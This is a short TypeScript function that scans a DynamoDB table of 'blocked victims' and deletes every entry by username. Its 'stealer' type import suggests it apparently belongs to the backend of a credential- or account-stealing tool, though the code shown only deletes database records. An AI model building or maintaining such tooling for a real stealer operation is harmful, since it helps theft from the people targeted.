import { environment } from '@/shared/config/environment';
import { deleteItem } from '@/shared/dynamo/deleteItem';
import { scanTable } from '@/shared/dynamo/scanTable';
import type { BlockedVictimItem } from '@/shared/types/stealer';

export async function clearBlockedVictims(): Promise<void> {
  const blockedVictims = await scanTable<BlockedVictimItem>(environment.blockedVictimsTableName);

  await Promise.all(
    blockedVictims.map((blockedVictim) =>
      deleteItem(environment.blockedVictimsTableName, {
        username: blockedVictim.username,
      }),
    ),
  );
}
